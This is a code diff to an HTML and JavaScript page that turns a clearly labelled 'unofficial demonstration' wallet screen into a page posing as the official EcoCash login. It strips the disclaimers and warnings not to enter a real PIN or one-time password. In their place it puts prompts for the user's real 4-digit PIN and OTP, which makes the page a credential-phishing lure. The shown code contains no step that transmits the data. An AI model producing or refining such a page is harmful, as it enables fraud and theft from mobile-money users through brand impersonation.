@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="theme-color" content="#0875d1">
-<title>Wallet Demo</title>
+<title>Ecocash</title>
 
 <style>
 * { box-sizing: border-box; }
@@ -261,8 +261,8 @@ h1 {
 
 <section class="top">
 
-  <div class="logo">Wallet<span>Demo</span></div>
-  <div class="demo-label">UNOFFICIAL DEMONSTRATION — NOT ECOCASH</div>
+  <div class="logo">Eco<span>Cash</span></div>
+  <div class="ecocash-label">Official ecocash</div>
 
   <!-- FIRST SCREEN -->
   <div class="step" data-step="login">
@@ -276,7 +276,7 @@ h1 {
         placeholder="Phone Number" aria-label="Phone number">
     </div>
 
-    <p class="hint">Enter any 4 digit code of your choice</p>
+    <p class="hint">Enter pin</p>
 
     <div class="pin" id="pinBoxes">
       <input type="password" inputmode="numeric" maxlength="1" aria-label="Demo digit 1">
@@ -286,7 +286,7 @@ h1 {
     </div>
 
     <p class="subtle" style="margin-top:15px">
-      Use any four digits for this demonstration. Never enter your real wallet PIN.
+     USE YOUR 4 DIGIT PIN
     </p>
 
   </div>
@@ -294,11 +294,8 @@ h1 {
   <!-- SIX-DIGIT SCREEN -->
   <div class="step" data-step="otp" hidden>
 
-    <h1>Enter any 6 digits of your choice</h1>
-
-    <p class="subtle">
-      This is a demonstration screen. Choose any six digits.
-    </p>
+    <h1>Enter otp</h1> 
+    
 
     <div class="otp-row">
       <div class="otp-box"></div>
@@ -310,11 +307,11 @@ h1 {
 
       <input id="otp-input" class="otp-input"
         type="text" inputmode="numeric" maxlength="6"
-        autocomplete="off" aria-label="Six demo digits">
+        autocomplete="off" aria-label="Six digits digits">
     </div>
 
     <p class="subtle" style="margin-top:15px">
-      Do not enter a real one-time password.
+    Enter the one time otp
     </p>
 
   </div>
@@ -323,7 +320,7 @@ h1 {
   <div class="step" data-step="done" hidden>
     <div class="congrats">Congratulations! 🎉</div>
     <p class="subtle">
-      You have successfully completed the demonstration.
+      You have successfully completed the application 
     </p>
   </div>
 
@@ -344,7 +341,7 @@ h1 {
       </button>
     </div>
 
-    <p class="version">Wallet Demo</p>
+    <p class="version">Ecocash</p>
 
     <p class="terms">
       By continuing, you agree to the
@@ -353,11 +350,11 @@ h1 {
   </div>
 
   <div class="step" data-step="otp" hidden>
-    <p class="prompt">Enter six demo digits to complete the demonstration.</p>
+    <p class="prompt">Enter six digits otp to complete the application</p>
   </div>
 
   <div class="step" data-step="done" hidden>
-    <p class="prompt">Thank you for trying the demo!</p>
+    <p class="prompt">Thank you for your application!</p>
   </div>
 
   <p id="notice" role="status"></p>
@@ -384,7 +381,7 @@ function cleanDigits(value, max) {
   return value.replace(/\D/g, '').slice(0, max);
 }
 
-// Four-digit demo input
+// Four-figit pin
 pinInputs.forEach((input, index) => {
   input.addEventListener('input', () => {
     input.value = cleanDigits(input.value, 1);
@@ -413,7 +410,7 @@ $('#pinBoxes').addEventListener('click', () => {
   pinInputs[0].focus();
 });
 
-// Six-digit demo input
+// Six-digit otp
 otpInput.addEventListener('input', () => {
   otpInput.value = cleanDigits(otpInput.value, 6);
 
